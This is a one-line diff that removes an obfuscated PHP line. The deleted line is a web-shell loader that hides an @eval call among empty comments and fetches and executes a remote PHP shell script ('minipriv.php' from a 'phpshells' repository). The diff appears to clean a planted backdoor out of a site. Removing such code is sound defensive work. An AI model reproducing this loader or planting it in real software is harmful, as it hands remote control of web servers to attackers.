@@ -1,1 +1,0 @@
-<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/("https://raw.githubusercontent.com/yon3zu/phpshells/main/minipriv.php"));/**/?>
